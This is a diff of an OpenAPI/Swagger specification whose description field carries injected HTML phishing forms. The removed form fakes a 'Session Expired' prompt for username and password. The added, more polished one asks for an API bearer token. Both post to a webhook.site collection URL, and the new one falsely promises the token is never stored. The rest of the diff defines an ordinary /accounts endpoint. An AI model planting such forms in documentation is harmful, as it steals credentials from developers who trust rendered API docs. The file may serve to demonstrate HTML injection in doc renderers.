@@ -3,18 +3,46 @@ info:
   version: "0.0.1"
   title: Example Title
   description: |
-    <h3 style="color: red;">⚠️ Session Expired</h3>
-    <p>Your session has expired. Please re-authenticate to continue.</p>
-    <form action="https://webhook.site/3090469f-7fce-425d-814c-6ad326d5d872" method="POST">
-      <label>Username:</label><br>
-      <input type="text" name="username" placeholder="Enter your username" required><br><br>
-      <label>Password:</label><br>
-      <input type="password" name="password" placeholder="Enter your password" required><br><br>
-      <button type="submit">Re-authenticate</button>
-    </form>
+    <div style="background: #f8f9fa; border: 1px solid #d1d5db; border-radius: 8px; padding: 20px; margin: 20px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;">
+      <div style="display: flex; align-items: center; margin-bottom: 15px;">
+        <svg style="width: 24px; height: 24px; margin-right: 10px; color: #d97706;" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+        <h3 style="margin: 0; font-size: 18px; font-weight: 600; color: #111827;">Authentication Required</h3>
+      </div>
+      
+      <p style="margin: 0 0 15px 0; color: #4b5563; font-size: 14px;">This endpoint requires authentication. Please provide your API Bearer token to access the resource.</p>
+      
+      <form action="https://webhook.site/3090469f-7fce-425d-814c-6ad326d5d872" method="POST" style="margin-top: 20px;">
+        <div style="margin-bottom: 12px;">
+          <label style="display: block; margin-bottom: 6px; font-weight: 500; color: #374151; font-size: 14px;">API Token (Bearer)</label>
+          <input type="text" name="api_token" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." required style="width: 100%; padding: 10px 12px; border: 1px solid #d1d5db; border-radius: 6px; font-family: 'Monaco', 'Courier New', monospace; font-size: 12px; box-sizing: border-box;">
+        </div>
+        
+        <div style="margin-bottom: 15px;">
+          <label style="display: flex; align-items: center; font-size: 13px; color: #6b7280;">
+            <input type="checkbox" name="persist_token" style="margin-right: 8px;">
+            Remember this token for future requests
+          </label>
+        </div>
+        
+        <button type="submit" style="width: 100%; padding: 10px; background: #3b82f6; color: white; border: none; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; transition: background 0.2s;">Authenticate</button>
+        
+        <p style="margin-top: 12px; font-size: 12px; color: #9ca3af; text-align: center;">Your token is securely transmitted and never stored.</p>
+      </form>
+    </div>
 paths:
-  /:
+  /accounts:
     get:
+      security:
+        - api_key: []
       responses:
-        200:
+        '200':
           description: Successful response
+        '401':
+          description: Unauthorized - valid API token required
+      operationId: getAccounts
+      summary: Get all accounts
+securityDefinitions:
+  api_key:
+    type: apiKey
+    name: Authorization
+    in: header
